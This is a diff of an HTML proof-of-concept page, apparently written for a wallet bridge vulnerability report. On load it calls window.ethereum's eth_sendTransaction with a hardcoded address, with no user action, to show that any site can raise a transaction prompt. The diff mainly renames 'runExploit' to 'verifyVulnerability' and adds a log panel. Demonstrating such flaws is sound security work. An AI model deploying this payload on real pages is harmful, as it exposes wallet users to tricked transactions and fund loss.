@@ -1,23 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Security PoC: Bridge Origin Validation Bypass</title>
+    <meta charset="UTF-8">
+    <title>Security Audit: JS Bridge Exposure</title>
+    <style>
+        body { font-family: sans-serif; background: #000; color: #0f0; padding: 20px; }
+        #log { border: 1px solid #0f0; padding: 15px; height: 300px; overflow-y: scroll; font-family: monospace; }
+    </style>
 </head>
 <body>
-    <h1>Security Audit: Bridge Access</h1>
-    <div id="status">Testing bridge availability...</div>
+    <h2>Security Audit: Unrestricted JS Bridge</h2>
+    <div id="log"></div>
 
     <script>
-        async function runExploit() {
-            const bridge = window.ethereum; // Namespace utama untuk DApp
-            const status = document.getElementById('status');
+        const logBox = document.getElementById('log');
+        function addLog(msg) { logBox.innerHTML += `<div>> ${msg}</div>`; }
 
-            if (bridge) {
-                status.innerHTML = "Bridge found. Attempting to trigger transaction...";
+        async function verifyVulnerability() {
+            addLog("Checking window.ethereum...");
+            if (window.ethereum) {
+                addLog("[!] Bridge object found.");
                 
+                // Bukti akses: Mencoba memanggil method tanpa interaksi
                 try {
-                    // Payload standar untuk membuktikan trigger terjadi tanpa otorisasi domain
-                    await bridge.request({
+                    addLog("Attempting silent transaction trigger...");
+                    await window.ethereum.request({
                         method: 'eth_sendTransaction',
                         params: [{
                             from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
@@ -26,16 +33,15 @@
                             data: '0x'
                         }]
                     });
-                    status.innerHTML = "Transaction UI triggered.";
-                } catch (err) {
-                    status.innerHTML = "UI triggered but rejected by user/system: " + err.message;
+                    addLog("[+] UI Triggered Successfully.");
+                } catch (e) {
+                    addLog("[!] UI Triggered (Error: " + e.message + ")");
                 }
             } else {
-                status.innerHTML = "No bridge detected.";
+                addLog("[-] Bridge object not found.");
             }
         }
-
-        window.onload = runExploit;
+        window.onload = verifyVulnerability;
     </script>
 </body>
 </html>
